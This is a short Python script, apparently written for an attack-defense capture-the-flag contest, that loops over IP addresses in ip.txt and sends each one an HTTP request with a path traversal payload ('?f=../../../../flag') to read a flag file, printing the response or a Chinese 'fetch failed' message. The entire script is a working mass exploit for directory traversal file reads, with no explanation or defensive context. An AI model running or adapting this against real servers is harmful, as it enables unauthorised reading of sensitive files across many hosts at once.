import requests

with open('ip.txt', 'r') as file:
    ip_list = file.read().splitlines()

for ip in ip_list:
    url = f"http://{ip}:80/?f=../../../../flag"
    try:
        response = requests.get(url)
        flag = response.text
        print(f"{ip}: {flag}")
    except:
        print(f"{ip}: 获取失败")
